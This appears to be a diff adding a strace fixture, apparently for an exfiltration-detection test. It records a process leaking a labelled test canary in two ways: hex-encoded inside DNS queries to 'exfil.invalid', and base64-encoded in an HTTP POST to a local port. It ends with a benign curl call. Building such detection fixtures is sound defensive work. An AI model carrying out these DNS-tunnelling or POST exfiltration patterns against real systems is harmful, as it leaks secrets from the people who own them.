@@ -1,0 +1,5 @@
+3725  connect(3<UDP:[4001]>, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("172.16.0.5")}, 16) = 0
+3725  sendmmsg(3<UDP:[4001]>, [{msg_hdr={msg_name=NULL, msg_namelen=0, msg_iov=[{iov_base="\264\234\1\0\0\1\0\0\0\0\0\086b685f746573745f63616e6172795f5a783831715077344c6d4e3076\5exfil\7invalid\0\0\1\0\1", iov_len=88}], msg_iovlen=1, msg_controllen=0, msg_flags=0}, msg_len=88}, {msg_hdr={msg_name=NULL, msg_namelen=0, msg_iov=[{iov_base="\301\300\1\0\0\1\0\0\0\0\0\086b685f746573745f63616e6172795f5a783831715077344c6d4e3076\5exfil\7invalid\0\0\34\0\1", iov_len=88}], msg_iovlen=1, msg_controllen=0, msg_flags=0}, msg_len=88}], 2, MSG_NOSIGNAL) = 2
+3725  connect(3<TCP:[4008]>, {sa_family=AF_INET, sin_port=htons(8765), sin_addr=inet_addr("127.0.0.1")}, 16) = -1 EINPROGRESS (Operation now in progress)
+3725  sendto(3<TCP:[127.0.0.1:47378->127.0.0.1:8765]>, "POST /c HTTP/1.0\r\nHost: x\r\nContent-Length: 49\r\n\r\ndata=a2hfdGVzdF9jYW5hcnlfWng4MXFQdzRMbU4wdkI3dFly", 98, 0, NULL, 0) = 98
+3727  execve("/usr/bin/curl", ["curl", "-s", "-o", "/dev/null", "https://github.com"], 0x55af97a6c820 /* 8 vars */) = 0
